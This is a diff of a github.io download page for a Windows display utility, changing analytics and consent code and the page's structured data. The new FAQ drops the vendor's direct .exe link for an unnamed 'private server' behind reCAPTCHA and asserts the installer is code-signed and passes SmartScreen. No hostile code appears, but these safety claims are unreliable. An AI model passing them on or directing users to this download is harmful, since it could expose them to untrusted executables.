+        gtag('js', new Date());
+        gtag('config', GA_ID, {anonymize_ip: true, send_page_view: false});
+        if(window.__gaQueue && window.__gaQueue.length){
+          window.__gaQueue.forEach(function(a){ try{ gtag.apply(null,a); }catch(e){} });
+          window.__gaQueue = [];
+        }
+        gtag('event','page_view',{page_location:location.href,page_path:location.pathname,page_title:document.title});
+      };
+      document.head.appendChild(s);
+    }
+
+    function grantAnalytics(){ gtag('consent','update',{analytics_storage:'granted'}); loadGA(); }
 
     // Cookie consent
-    const cookieBanner = document.getElementById('cookieBanner');
-    const acceptBtn = document.getElementById('acceptCookies');
-    const declineBtn = document.getElementById('declineCookies');
-    const closeBtn = document.getElementById('closeCookies');
-    const manageBtn = document.getElementById('manageCookies');
+    var saved = localStorage.getItem('display_ex_cookie_consent');
+    var cb = document.getElementById('cookieBanner');
+    if(saved === 'granted'){ grantAnalytics(); }
+    else if(!saved){ cb.style.display = 'flex'; }
 
-    function getConsent(){return localStorage.getItem('display_ex_cookie_consent')}
-    function setConsent(v){localStorage.setItem('display_ex_cookie_consent', v)}
-    function showBanner(){cookieBanner.style.display='flex'}
-    function hideBanner(){cookieBanner.style.display='none'}
-
-    function initGA(){
-      if(window.gtagLoaded) return;
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments)}
-      window.gtag = gtag;
-      gtag('js', new Date());
-      gtag('config', GA_ID, { 'anonymize_ip': true });
-      const s=document.createElement('script');
-      s.src = 'https://www.googletagmanager.com/gtag/js?id=' + GA_ID;
-      s.async = true;
-      document.head.appendChild(s);
-      window.gtagLoaded = true;
-    }
-
-    acceptBtn.addEventListener('click', ()=>{ setConsent('granted'); initGA(); hideBanner(); });
-    declineBtn.addEventListener('click', ()=>{ setConsent('denied'); hideBanner(); });
-    closeBtn.addEventListener('click', ()=> hideBanner());
-    manageBtn.addEventListener('click', ()=> showBanner());
-
-    document.addEventListener('DOMContentLoaded', ()=>{
-      const consent = getConsent();
-      if(consent===null){ showBanner(); }
-      else if(consent==='granted'){ initGA(); }
-
+    document.getElementById('acceptCookies').addEventListener('click', function(){
+      localStorage.setItem('display_ex_cookie_consent','granted');
+      cb.style.display='none';
+      grantAnalytics();
+    });
+    document.getElementById('declineCookies').addEventListener('click', function(){
+      localStorage.setItem('display_ex_cookie_consent','denied');
+      cb.style.display='none';
+    });
+    document.getElementById('closeCookies').addEventListener('click', function(){ cb.style.display='none'; });
+    document.getElementById('manageCookies').addEventListener('click', function(){ cb.style.display='flex'; });
+    document.addEventListener('DOMContentLoaded', function(){
       document.getElementById('year').textContent = new Date().getFullYear();
-      const lm = document.lastModified || '';
-      document.getElementById('lastModified').textContent = lm ? lm : '—';
-
-      // Attach download tracking
-      document.querySelectorAll('[data-url]').forEach(el=>{
-        el.addEventListener('click', function(){
-          const fname = this.dataset.filename || this.textContent.trim();
-          const furl = this.dataset.url || this.href;
-          sendDownloadEvent(fname, furl);
-        });
-      });
     });
 
-    function sendDownloadEvent(filename, fileUrl){
-      try{
-        if(typeof window.gtag === 'function'){
-          window.gtag('event','file_download', {event_category:'downloads', event_label: filename, file_url: fileUrl});
-        }
-      }catch(e){console.warn('Download event failed', e)}
-    }
-
+    // Track captcha trigger clicks
     document.addEventListener('click', function(e){
-      const a = e.target.closest('a');
-      if(!a) return;
-      if(a.href && a.href.startsWith('http')){ a.setAttribute('rel','noopener'); }
+      var btn = e.target.closest('[data-captcha-trigger]');
+      if(!btn) return;
+      var label = btn.dataset.captchaKeyword || btn.textContent.trim();
+      try{
+        if(typeof gtag === 'function' && window.__gaInitialized){
+          gtag('event','captcha_open',{event_category:'downloads',event_label:label});
+        } else {
+          window.__gaQueue.push(['event','captcha_open',{event_category:'downloads',event_label:label}]);
+        }
+      } catch(err){}
     });
   </script>
 
-  <!-- JSON-LD structured data -->
+  <!-- Structured data -->
   <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@graph": [
-      {
-        "@type": "WebPage",
-        "@id": "https://display-ex.github.io/download-windows.html#webpage",
-        "url": "https://display-ex.github.io/download-windows.html",
-        "name": "Official Download & System Requirements — Display EX for Windows",
-        "isPartOf": {"@id": "https://display-ex.github.io/#website"},
-        "datePublished": "2026-05-08",
-        "dateModified": "2026-05-08",
-        "breadcrumb": {"@id": "https://display-ex.github.io/download-windows.html#breadcrumb"}
-      },
-      {
-        "@type": "BreadcrumbList",
-        "@id": "https://display-ex.github.io/download-windows.html#breadcrumb",
-        "itemListElement": [
-          {"@type": "ListItem", "position": 1, "name": "Home", "item": "https://display-ex.github.io/"},
-          {"@type": "ListItem", "position": 2, "name": "Download", "item": "https://display-ex.github.io/download-windows.html"}
-        ]
-      },
-      {
-        "@type": "WebSite",
-        "@id": "https://display-ex.github.io/#website",
-        "url": "https://display-ex.github.io/",
-        "name": "Display EX",
-        "publisher": { "@type": "Organization", "name": "Display EX" }
-      },
-      {
-        "@type": "SoftwareApplication",
-        "@id": "https://display-ex.github.io/#software",
-        "name": "Display EX",
-        "description": "Display EX for Windows — manage multi-monitor layouts, fix high-DPI blur, enable high refresh rates and HDR, and switch profiles per app.",
-        "applicationCategory": "Utilities",
-        "operatingSystem": "Windows 11, Windows 10 (64-bit)",
-        "softwareVersion": "1.10.33",
-        "downloadUrl": "https://www.cdisplayex.com/files/CDXWin64v1.10.33.exe",
-        "url": "https://display-ex.github.io/download-windows.html",
-        "offers": {"@type": "Offer", "price": 0, "priceCurrency": "USD"},
-        "potentialAction": {"@type": "DownloadAction", "target": "https://www.cdisplayex.com/files/CDXWin64v1.10.33.exe"},
-        "publisher": {"@type": "Organization", "name": "Display EX", "url": "https://display-ex.github.io/"},
-        "datePublished": "2026-05-08",
-        "dateModified": "2026-05-08"
-      },
-      {
-        "@type": "FAQPage",
-        "mainEntity": [
-          {"@type": "Question", "name": "Is this 64-bit only?", "acceptedAnswer": {"@type": "Answer", "text": "Yes, Display EX supports Windows 11/10 on 64-bit systems."}},
-          {"@type": "Question", "name": "Is it free?", "acceptedAnswer": {"@type": "Answer", "text": "The installer is free to download and use."}},
-          {"@type": "Question", "name": "Where does the file come from?", "acceptedAnswer": {"@type": "Answer", "text": "From the canonical distribution URL at cdisplayex.com, linked on this page."}},
-          {"@type": "Question", "name": "Can I do a silent install?", "acceptedAnswer": {"@type": "Answer", "text": "See the Enterprise page for deployment options and silent install guidance."}}
-        ]
-      }
-    ]
-  }
+  {"@context":"https://schema.org","@graph":[
+    {"@type":"WebPage","@id":"https://display-ex.github.io/download-windows.html#webpage","url":"https://display-ex.github.io/download-windows.html","name":"Download Display EX for Windows — Free Installer","inLanguage":"en","dateModified":"2026-06-08"},
+    {"@type":"SoftwareApplication","name":"Display EX","applicationCategory":"Utilities","operatingSystem":"Windows 10, Windows 11","softwareVersion":"1.10.33","offers":{"@type":"Offer","price":"0","priceCurrency":"USD"},"downloadUrl":"https://display-ex.github.io/download-windows.html","dateModified":"2026-06-08",
+      "potentialAction":{"@type":"DownloadAction","target":{"@type":"EntryPoint","urlTemplate":"https://display-ex.github.io/download-windows.html"},"name":"Download Display EX for Windows"}},
+    {"@type":"FAQPage","mainEntity":[
+      {"@type":"Question","name":"Why is reCAPTCHA required to download?","acceptedAnswer":{"@type":"Answer","text":"The installer is served from a private server rather than GitHub Pages. reCAPTCHA prevents automated abuse and protects bandwidth. Verification takes seconds; the download starts immediately after."}},
+      {"@type":"Question","name":"Is Display EX free?","acceptedAnswer":{"@type":"Answer","text":"Yes, Display EX is completely free. No account or payment required."}},
+      {"@type":"Question","name":"Is the installer safe?","acceptedAnswer":{"@type":"Answer","text":"Yes. The installer is code-signed with an Authenticode certificate. Windows SmartScreen will not block it."}}
+    ]}
+  ]}
   </script>
-
 </body>
 </html>
